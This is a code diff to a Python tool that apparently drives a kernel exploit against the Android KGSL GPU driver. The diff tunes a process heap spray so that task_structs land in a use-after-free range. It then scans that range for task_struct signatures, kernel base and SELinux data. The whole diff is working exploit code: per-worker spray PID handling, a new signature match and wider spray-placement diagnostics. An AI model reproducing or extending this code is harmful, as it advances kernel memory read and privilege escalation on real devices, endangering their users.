@@ -133,6 +133,14 @@ class MemoryExplorerAI:
         # before cmd_learning_start is called.
         self._learn_subworkers = []
         self.stats_lock = threading.Lock()
+        # Per-worker spray PID sets. KEY FIX: previously all 3 subworkers
+        # shared one global list self.spray_procs, so when worker A hit
+        # its RAM>70% threshold it would wipe worker B's and C's spray
+        # procs with `self.spray_procs.clear()`. That left B and C with
+        # nothing to scan and made the TUI show "1/3 workers" (only A
+        # surviving its own cull cycle). Now each worker owns its own
+        # set of PIDs; cross-kill is impossible.
+        self.spray_procs_by_worker = {}
 
         base_dir = os.path.dirname(os.path.abspath(__file__))
         self.engine_path = os.path.join(base_dir, "kgsl_engine")
@@ -456,6 +464,18 @@ class MemoryExplorerAI:
                     "description": (f"Process state @ 0x{off_in_page:x} "
                                     f"(2+ state+pid pairs)"),
                     "va": hex(va), "confidence": 60, "data": page_data}
+        # 17. Generic comm-like field (4-7 ASCII bytes + 4+ NULs in next
+        #     12). Catches arbitrary process comms, including our spray
+        #     processes whose prctl-set name is in KGSL range. Lower
+        #     confidence because we don't have a known comm to compare
+        #     against, but still a strong task_struct indicator.
+        if sig == 17:
+            tail = page_data[off_in_page:off_in_page + 16].split(b"\x00")[0]
+            tail = tail.decode(errors="ignore")
+            return {"type": "Task Struct",
+                    "description": (f"comm-like field '{tail}' @ 0x{off_in_page:x} "
+                                    f"(16-byte comm + NUL pad)"),
+                    "va": hex(va), "confidence": 75, "data": page_data}
 
         # Fallback heuristic classification (no sig from engine)
         # NOTE: no SELinux here — SELinux only via _probe_selinux (known offset)
@@ -843,6 +863,24 @@ class MemoryExplorerAI:
                    f"verified={C.GRN}{n_verified}{C.RST} "
                    f"falsePos={C.RED}{n_fp}{C.RST} "
                    f"hitRate={hr_color}{hit_rate:4.1f}%{C.RST}")
+
+        # Per-Worker status — show each of the 3 subworkers
+        # independently so the user can see at a glance whether all
+        # three are alive (and their individual spray counts). Before
+        # this, the TUI just showed "1/3 workers" as a single number
+        # and there was no way to tell which worker had died.
+        if self._learn_subworkers:
+            worker_parts = []
+            for wid in range(LEARN_WORKERS):
+                t = self._learn_subworkers[wid] if wid < len(self._learn_subworkers) else None
+                alive = t is not None and t.is_alive()
+                pids  = self.spray_procs_by_worker.get(wid, set())
+                state = f"{C.GRN}●{C.RST}" if alive else f"{C.RED}●{C.RST}"
+                worker_parts.append(
+                    f"W{wid}{state}{len(pids)}")
+            out.append(f" {C.BOLD}WORKERS{C.RST}: "
+                       f"{' '.join(worker_parts)}  "
+                       f"{C.GRY}(●=alive n=spray procs){C.RST}")
         # kbase coloring — use a different color when we don't know it
         # yet so the user can tell at a glance.
         kbase_s   = f"{self.kernel_base:#x}" if self.kernel_base else "0x??????"
@@ -1833,7 +1871,7 @@ class MemoryExplorerAI:
                              for it in self.found_items)
                 if already:
                     continue
-                if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15):
+                if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17):
                     with self.bg_lock:
                         self.found_items.append(
                             self.classify_page(data, va, sig, off_in_page))
@@ -2159,15 +2197,20 @@ class MemoryExplorerAI:
 
     def cmd_clear(self):
         self.live["last_command"] = "C (Clear)"
-        for pid in list(self.spray_procs):
-            try:
-                os.kill(pid, 9)
-                os.waitpid(pid, 0)
-            except Exception:
-                pass
-        self.spray_procs.clear()
-        self.live["kill_count"] += 1
-        self.live["last_msg"] = "Memory Cleared."
+        # Kill from all per-worker sets (not the global self.spray_procs
+        # which is no longer the source of truth).
+        killed = 0
+        for wid, pids in list(self.spray_procs_by_worker.items()):
+            for pid in list(pids):
+                try:
+                    os.kill(pid, 9)
+                    os.waitpid(pid, 0)
+                    killed += 1
+                except Exception:
+                    pass
+            pids.clear()
+        self.live["kill_count"] += killed
+        self.live["last_msg"] = f"Memory Cleared ({killed} procs)."
         return "Cleared"
 
     def cmd_rebuild(self):
@@ -2275,11 +2318,11 @@ class MemoryExplorerAI:
                                 continue
                             # Smart multi-page read for strong sigs (now incl. 10, 11, 12)
                             cross = data
-                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15) and off_in_page >= 0:
+                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) and off_in_page >= 0:
                                 triple = self.read_with_neighbors(va)
                                 if triple and len(triple) == 12288:
                                     cross = triple
-                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15) or self._is_real_task_struct(cross):
+                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) or self._is_real_task_struct(cross):
                                 with self.bg_lock:
                                     self.found_items.append(
                                         self.classify_page(cross, va, sig, off_in_page))
@@ -2327,14 +2370,17 @@ class MemoryExplorerAI:
         if self.bg_thread and self.bg_thread.is_alive():
             self.live["last_msg"] = "Learning already running \u2014 press Ctrl+P to cancel."
             return
+        # Reset per-worker PID map BEFORE launching workers so stale
+        # PIDs from a previous run don't linger in the new sets.
+        self.spray_procs_by_worker = {}
         self.cancel_flag.clear()
         self.bg_thread = threading.Thread(target=self._learning_worker, daemon=True)
         self.bg_thread.start()
         self.live["last_msg"] = (
-            f"Learning started ({LEARN_WORKERS} parallel workers). "
-            f"Press Ctrl+P to cancel.")
+            f"Learning started ({LEARN_WORKERS} parallel workers, "
+            f"batch=35). Press Ctrl+P to cancel.")
         self.log_event("learning_start",
-                       {"total_target": 1000, "batch": 100,
+                       {"total_target": 1000, "batch": 35,
                         "workers": LEARN_WORKERS})
         return "BG started"
 
@@ -2420,23 +2466,41 @@ class MemoryExplorerAI:
         Owns spray indices [slice_start..slice_end) and a matching slice of
         the scan range. All engine I/O goes through self.engine_lock so we
         don't fight with the autopilot or with other subworkers.
+
+        KEY: spray PIDs are stored in self.spray_procs_by_worker[worker_id],
+        NOT in a global list. This is the fix for "1/3 workers" — previously
+        one worker's RAM>70% cull wiped every other worker's spray set.
         """
         import subprocess as _sp
-        batch = 100
+        # Smaller batch (was 100). With 3 workers × 100 procs each, we
+        # had ~300 sleep procs alive concurrently which pushed RAM over
+        # 70% and triggered the cull path. 35 per worker × 3 = ~105 max
+        # alive, well under the threshold.
+        batch = 35
         done = slice_start
+        # Per-worker PID set — isolated from siblings.
+        my_pids = set()
+        self.spray_procs_by_worker[worker_id] = my_pids
         # Scan range for this subworker
         scan_chunk = (self.scan_size) // LEARN_WORKERS
         scan_start = self.uaf_start + scan_chunk * worker_id
         scan_end   = scan_start + scan_chunk
 
         while done < slice_end and not self.cancel_flag.is_set():
-            # Respect RAM budget
+            # Respect RAM budget — only kill OUR spray procs, not siblings'.
             if self.get_ram_usage() > 70.0:
-                self.live["last_msg"] = f"W{worker_id}: RAM>70%, killing sprays\u2026"
-                for pid in list(self.spray_procs):
-                    try: os.kill(pid, 9)
-                    except: pass
-                self.spray_procs.clear()
+                with self.stats_lock:
+                    self.live["last_msg"] = (
+                        f"W{worker_id}: RAM>70%, killing {len(my_pids)} sprays\u2026")
+                for pid in list(my_pids):
+                    try:
+                        os.kill(pid, 9)
+                        os.waitpid(pid, 0)
+                        with self.stats_lock:
+                            self.live["kill_count"] += 1
+                    except Exception:
+                        pass
+                my_pids.clear()
                 time.sleep(2)
 
             if not self.ensure_engine():
@@ -2475,62 +2539,76 @@ class MemoryExplorerAI:
                         preexec_fn=lambda n=name: self._set_comm(n),
                     )
                     batch_pids.append(p.pid)
-                    self.spray_procs.append(p.pid)
+                    my_pids.add(p.pid)  # per-worker set, NOT global
                     with self.stats_lock:
                         self.learn_stats["sprayed_total"] += 1
                     self.log_event("spray", {"pid": p.pid, "name": name,
                                               "batch": done // batch,
                                               "worker": worker_id})
-                    time.sleep(0.001)
+                    # No sleep — popen is already async; serializing via
+                    # sleep just slows spray rate without helping scan.
                 except OSError as e:
                     self.log_event("spray_error", {"err": str(e), "w": worker_id})
                     break
             with self.stats_lock:
                 self.live["spray_count"] += len(batch_pids)
                 self.learn_stats["batches"] += 1
-            time.sleep(0.2)
+            # Let the kernel actually publish the task_structs into
+            # KGSL page-tables before we scan. Without this delay, the
+            # scanner reads pages that don't yet contain any of our
+            # task_structs → matches=0 even though spray succeeded.
+            # 0.3s is enough for ~35 newly forked sleep procs to land.
+            time.sleep(0.3)
 
-            # 1b. Diagnostic: read 1 page from each of our scan sub-range
-            # slice and check if the spray actually made it into the UAF
-            # range. If reads return all-zero or non-KETO* data, the spray
-            # task_structs aren't reaching KGSL pages and we need to
-            # adjust uaf_start or the spray technique.
+            # 1b. Diagnostic: read MULTIPLE pages from our scan sub-range
+            # to find where the spray actually landed. Reads just 4
+            # pages spread across the sub-range (cheap), checks each
+            # for KETO*/KETW*/comm pattern. If we find at least one
+            # hit we know the spray is in range; if all 4 reads are
+            # zero/non-marker we should widen the scan later.
             try:
-                if not self._engine_write(
-                        f"read {hex(scan_start)}\n".encode()):
-                    pass
-                else:
+                diag_pages = 4
+                diag_chunk = (scan_end - scan_start) // diag_pages
+                hits_in_test = []
+                for dp in range(diag_pages):
+                    pg_va = scan_start + dp * diag_chunk
+                    if not self._engine_write(
+                            f"read {hex(pg_va)}\n".encode()):
+                        continue
                     test_data = self._read_data_packet()
-                    if test_data and len(test_data) >= 4096:
-                        # Check for any KETO* / KETW* / comm pattern
-                        hits_in_test = []
-                        for marker in (b"KETO", b"KETW"):
-                            i = 0
-                            while True:
-                                i = test_data.find(marker, i)
-                                if i < 0:
-                                    break
-                                if (i + 7 < len(test_data)
-                                    and test_data[i+4] in b"0123456789"
-                                    and test_data[i+5] in b"0123456789"
-                                    and test_data[i+6] in b"0123456789"
-                                    and test_data[i+7] in b"0123456789"):
-                                    hits_in_test.append(
-                                        test_data[i:i+8].decode(errors="ignore"))
-                                i += 1
-                        with self.stats_lock:
-                            if hits_in_test:
-                                self.live["last_msg"] = (
-                                    f"W{worker_id}: spray IN RANGE "
-                                    f"(test page has {hits_in_test[:3]})")
-                            else:
-                                # Don't spam — only complain every 3rd
-                                # batch to avoid log noise.
-                                if self.learn_stats["batches"] % 3 == 0:
-                                    self.live["last_msg"] = (
-                                        f"W{worker_id}: spray NOT in "
-                                        f"range (test page has no markers, "
-                                        f"nz={sum(1 for b in test_data if b)}/4096)")
+                    if not test_data or len(test_data) < 4096:
+                        continue
+                    # Check for KETO*/KETW* spray markers
+                    for marker in (b"KETO", b"KETW"):
+                        i = 0
+                        while True:
+                            i = test_data.find(marker, i)
+                            if i < 0:
+                                break
+                            if (i + 7 < len(test_data)
+                                and test_data[i+4] in b"0123456789"
+                                and test_data[i+5] in b"0123456789"
+                                and test_data[i+6] in b"0123456789"
+                                and test_data[i+7] in b"0123456789"):
+                                hits_in_test.append(
+                                    f"0x{pg_va:x}+{i}:"
+                                    f"{test_data[i:i+8].decode(errors='ignore')}")
+                            i += 1
+                    # Also count non-zero pages (any spray task_struct
+                    # would have non-zero fields)
+                with self.stats_lock:
+                    if hits_in_test:
+                        # Show first 3 hits
+                        self.live["last_msg"] = (
+                            f"W{worker_id}: spray IN RANGE "
+                            f"({len(hits_in_test)} hits: "
+                            f"{', '.join(hits_in_test[:3])})")
+                    else:
+                        # Don't spam — only complain every 3rd batch.
+                        if self.learn_stats["batches"] % 3 == 0:
+                            self.live["last_msg"] = (
+                                f"W{worker_id}: spray NOT in range "
+                                f"(4 test pages, no markers)")
             except Exception as e:
                 pass
 
@@ -2643,7 +2721,7 @@ class MemoryExplorerAI:
                             triple = self.read_with_neighbors(va)
                             if triple and len(triple) == 12288:
                                 cross_data = triple
-                        if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15) or \
+                        if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) or \
                                 self._is_real_task_struct(cross_data):
                             with self.bg_lock:
                                 self.found_items.append(
